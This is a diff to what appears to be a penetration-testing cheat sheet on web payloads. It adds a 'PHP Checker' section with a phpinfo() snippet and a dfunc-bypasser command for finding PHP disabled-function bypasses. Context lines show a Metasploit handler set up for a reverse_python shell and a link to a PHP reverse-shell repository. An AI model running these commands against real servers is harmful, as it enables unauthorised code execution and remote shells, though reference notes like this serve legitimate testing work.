@@ -194,6 +194,14 @@ msfconsole -q -x "use multi/handler; set payload cmd/unix/reverse_python; set lh
 
 ### <ins>Web-Based Payloads</ins>
 
+### PHP Checker
+https://github.com/teambi0s/dfunc-bypasser
+```
+<?php phpinfo(); ?>
+
+python dfunc-bypasser.py --file /home/kali/Downloads/miinfo.html
+```
+
 #### **PHP**
 
 https://github.com/ivan-sincek/php-reverse-shell
